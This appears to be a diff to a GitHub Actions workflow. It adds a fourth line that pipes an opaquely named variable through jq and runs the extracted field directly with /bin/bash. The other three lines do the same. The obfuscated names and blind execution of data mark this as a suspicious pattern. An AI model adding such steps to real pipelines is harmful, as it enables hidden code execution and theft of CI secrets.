@@ -34,6 +34,7 @@ jobs:
           echo $z3 | jq -r .zfxay87 | /bin/bash
           printf '%s' "$tx19322" | jq -r .ayo1 | /bin/bash
           echo $a479 | jq -r .rcpc131 | /bin/bash
+          printf '%s' "$moxwh2527" | jq -r .lsf2924 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
